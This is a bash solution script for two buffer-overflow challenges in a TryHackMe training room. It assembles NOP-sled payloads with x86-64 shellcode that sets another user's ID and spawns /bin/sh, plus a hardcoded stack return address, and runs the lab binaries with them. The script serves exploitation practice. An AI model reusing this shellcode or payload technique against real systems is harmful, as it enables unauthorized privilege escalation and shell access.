#!/usr/bin/env bash

# simple script to solve tasks eight and nine (the final two overflows) of the buffer overflow room 
# on tryhack me: https://tryhackme.com/room/bof1

# based on the write-up here: https://l1ge.github.io/tryhackme_bof1/
# this room is not as easy as it makes itself out to be :D

# util function in bash to repeat characters (equiv to 'A'*60 in python for example)
function repeat { printf "%.s$1" $(seq 1 $2); }

# a target position in the stack, roughly where the buffer is. Always in a valid place thanks to no ASLR on the machine
# note that this won't work in gdb, as the stack moves a bit thanks to env vars, various other bits and pieces.
# therefore, if testing in gdb, swap in \x60 instead of \x98 at the start
target='\x98\xe2\xff\xff\xff\x7f'

# note this shell code is 62 bytes long, sets an exit code and sets the UUID to user2, required for the secret file
# without the exit code (like the shellcode provided in the room) the program will just continue and crash.
shellcode1='\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05'
#                                                          ^               ^
# same as the previous except that the uuid is changed from 1002 (03EA) to 1003 (03EB)
#                                                          v               v
shellcode2='\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEB\x03\x66\xBF\xEB\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05'

# final code for first injection: 152 + address
injected1=$(repeat "\x90" 60)$(printf $shellcode1)$(repeat A 30)$(printf $target)

# note changing EA to EB 13 characters in. this is switching from uuid 1002 (03EA) to 1003 (03EB)
# found via gdb, the total space is 163 + address
injected2=$(repeat "\x90" 60)$(printf $shellcode2)$(repeat A 41)$(printf $target)

~/overflow-3/buffer-overflow $injected1
~/overflow-4/buffer-overflow-2 $injected2